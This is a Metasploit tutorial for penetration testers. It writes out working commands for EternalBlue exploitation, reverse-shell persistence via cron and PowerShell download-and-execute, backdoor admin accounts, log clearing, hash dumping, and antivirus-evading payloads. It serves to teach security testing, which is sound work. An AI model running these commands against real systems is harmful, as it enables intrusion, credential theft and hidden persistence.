## Introduction to MetaSploit

MetaSploit is an advanced open-source framework for developing, testing, and executing exploits against remote target machines. It's one of the most powerful tools in a penetration tester's arsenal, providing a structured environment for penetration testing across various stages.

### Key Components:
- **MetaSploit Framework (MSF)**: The core component
- **MetaSploit Pro**: Commercial version with additional features
- **MetaSploit Community**: Free version with GUI
- **MetaSploit Express**: Mid-range commercial offering

### Ethical Usage:
Always remember that these tools should only be used:
- Against systems you own
- Systems you have explicit permission to test
- In controlled lab environments
- For educational purposes

## Installation and Setup

### On Kali Linux:
MetaSploit comes pre-installed on Kali Linux. To ensure you have the latest version:

```bash
sudo apt update
sudo apt upgrade
```

### Starting MetaSploit:
```bash
sudo systemctl start postgresql
sudo msfdb init  # Initialize the database
sudo msfconsole  # Launch the MetaSploit console
```

### Verify Installation:
Once in the MSF console:
```
db_status  # Should show connected to msf database
```

## MetaSploit Architecture

Understanding MetaSploit's architecture helps use it more effectively:

### Core Components:
1. **Libraries**: Code providing functionalities for the framework
2. **Interfaces**: Ways to interact with the framework (Console, CLI, GUI)
3. **Modules**: Pieces of code that perform specific tasks
4. **Tools**: Standalone utilities that complement the framework
5. **Plugins**: Extend functionality

### Module Types:
- **Exploits**: Code that takes advantage of vulnerabilities
- **Payloads**: Code delivered and executed on the target
- **Auxiliaries**: Supporting modules (scanners, fuzzers, etc.)
- **Post**: Modules for post-exploitation
- **Encoders**: Used to encode payloads to evade detection
- **NOPs**: No Operation code to maintain payload size
- **Evasion**: Modules specifically designed to bypass security measures

## Basic Commands

### Console Navigation:
```
help                  # Display help menu
search <keyword>      # Search for modules

```

## Exploitation

### Basic Exploitation Process:
1. Find a suitable exploit
2. Configure it correctly
3. Execute and gain access

### Finding Exploits:
```
search type:exploit platform:windows ms17-010
```

### Exploiting MS17-010 (EternalBlue) Example:
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
```

### Payload Types:
- **Singles**: Self-contained payloads
- **Stagers**: Load a larger payload in stages
- **Staged**: Full payload delivered in stages

### Common Payloads:
```
windows/meterpreter/reverse_tcp     # Windows Meterpreter reverse TCP
linux/x86/meterpreter/reverse_tcp   # Linux Meterpreter reverse TCP
windows/shell/reverse_tcp           # Simple Windows command shell
cmd/unix/reverse_python             # Python-based reverse shell
```

### Exploit Options:
```
show targets          # Show available targets for current exploit
set TARGET <number>   # Select specific target
show payloads         # Show compatible payloads
set PAYLOAD <payload> # Select specific payload
check                 # Check if target is vulnerable without exploiting
```

## Post-Exploitation

### Meterpreter Basics:
Once you have a Meterpreter session, you can:
```
help                  # Show available commands
getuid                # Show current user
sysinfo              # Show system information
ps                    # Show running processes
migrate <PID>         # Migrate to another process
```

### File System Operations:
```
pwd                   # Print working directory
ls                    # List files
cat <file>            # Display file contents
download <file>       # Download file to attacker machine
upload <file>         # Upload file to target
edit <file>           # Edit a file
```

### Network Commands:
```
ipconfig              # Show network configuration
netstat -ano          # Show network connections
portfwd add -l 3389 -p 3389 -r 192.168.1.100  # Port forwarding
```

### Managing Sessions:
```
background            # Background current session
sessions -l           # List all sessions
sessions -i <ID>      # Interact with specific session
sessions -k <ID>      # Kill a session
```

## Privilege Escalation

### Windows Privilege Escalation:
```
use post/windows/gather/enum_patches   # Check for missing patches
use post/windows/gather/enum_applications  # Enumerate installed applications
getsystem                              # Attempt privilege escalation
use exploit/windows/local/service_permissions  # Exploit service permissions
```

### Linux Privilege Escalation:
```
use post/linux/gather/enum_configs     # Gather configuration files
use post/linux/gather/enum_system      # Gather system information
use exploit/linux/local/docker_daemon_privilege_escalation  # Docker privilege escalation
```

### Using Local Exploit Suggester:
```
use post/multi/recon/local_exploit_suggester
set SESSION <ID>
run
```

## Maintaining Access

### Creating Persistent Backdoors:
```
run persistence -h    # Show persistence options
run persistence -U -i 30 -p 443 -r 192.168.1.5  # User persistence, 30s interval

# Windows registry persistence
use exploit/windows/local/persistence_service
set SESSION <ID>
set LHOST 192.168.1.5
run
```

### Creating Alternate Access Methods:
```
# Add a backdoor user
shell
net user hacker P@ssw0rd /add
net localgroup administrators hacker /add
exit
```

### Using Scheduled Tasks (Windows):
```
# Create a scheduled task for persistence
shell
schtasks /create /sc minute /mo 1 /tn "WindowsUpdate" /tr "powershell -c 'iex (New-Object Net.WebClient).DownloadString(\"http://192.168.1.5:8080/payload.ps1\")'"
exit
```

### Using Cron Jobs (Linux):
```
# Add a cron job for persistence
shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'" > /tmp/cron
crontab /tmp/cron
rm /tmp/cron
exit
```

## Covering Tracks

### Clearing Event Logs (Windows):
```
clearev               # Clear Windows event logs from Meterpreter
```

### Removing Shell History (Linux):
```
shell
unset HISTFILE
rm -f ~/.bash_history
exit
```

### Disabling Logging:
```
use post/windows/manage/disable_windows_defender
set SESSION <ID>
run
```

### Timestomp (Modify File Timestamps):
```
timestomp <file> -m "01/01/2022 12:00:00"  # Modify file's modified time
```

## Reporting

### Taking Screenshots:
```
screenshot            # Capture screen in Meterpreter
```

### Collecting Evidence:
```
hashdump              # Dump password hashes
run post/windows/gather/smart_hashdump  # Smarter hash dumping
run post/multi/gather/env               # Gather environment information
```

### Using Resource Scripts:
Create a file called `report.rc` with:
```
spool /path/to/logfile.txt
<commands to run>
spool off
```

Run with:
```
resource /path/to/report.rc
```

## Advanced MetaSploit Usage

### Creating Custom Modules:
Modules are located in `/usr/share/metasploit-framework/modules/`

Basic module structure:
```ruby
require 'msf/core'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TCP
  
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'My Custom Scanner',
      'Description' => 'Scans for something specific',
      'Author'      => 'Your Name',
      'License'     => MSF_LICENSE
    ))
    register_options([
      OptString.new('RHOSTS', [true, 'Target hosts', '']),
      OptInt.new('RPORT', [true, 'Target port', 80])
    ])
  end
  
  def run
    # Your code here
  end
end
```

### Using the Metasploit API:
```ruby
require 'msf/core'
framework = Msf::Simple::Framework.create
exploit = framework.exploits.create('windows/smb/ms17_010_eternalblue')
```

### Automation with Resource Scripts:
Create a file called `auto_exploit.rc`:
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS file:/path/to/targets.txt
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit -j
```

Run with:
```
msfconsole -r auto_exploit.rc
```

### Using MSFvenom for Payload Creation:
```bash
# List payload options
msfvenom -l payloads

# Create a Windows executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > payload.exe

# Create a PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw > shell.php

# Create a Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw > payload.py
```

### Evading Antivirus:
```bash
# Using encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded_payload.exe

# Using template files
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/to/legit.exe -f exe > injected.exe
```

## Ethical Considerations and Legal Compliance

### Before Conducting Tests:
1. **Obtain Written Permission**: Always have written authorization before testing any system.
2. **Define Scope**: Clearly define which systems are in-scope and which are out-of-scope.
3. **Establish Rules of Engagement**: Document testing hours, notification procedures, etc.
4. **Have a Point of Contact**: Know who to contact in case of emergencies.

### During Tests:
1. **Stay Within Scope**: Never test systems outside your authorized scope.
2. **Document Everything**: Keep detailed logs of all activities.
3. **Avoid Destruction**: Do not intentionally cause damage or disruption.
4. **Use Reasonable Intensity**: Avoid denial of service conditions.

### After Tests:
1. **Detailed Reporting**: Document all findings, vulnerabilities, and recommendations.
2. **Secure Data Handling**: Properly secure and eventually destroy any sensitive data collected.
3. **Follow-up Support**: Offer assistance in understanding and remediating issues.

### Legal Frameworks to Be Aware Of:
- Computer Fraud and Abuse Act (CFAA) in the US
- General Data Protection Regulation (GDPR) in Europe
- Local computer crime laws in your jurisdiction

Remember that unauthorized use of these techniques may result in severe legal consequences, including criminal charges. Always operate within the boundaries of the law and with proper authorization.

## Conclusion

MetaSploit is a powerful framework that enables ethical hackers to test systems comprehensively. With great power comes great responsibility—use these techniques ethically and legally. Continuous learning is essential in this field as new vulnerabilities and techniques emerge regularly.
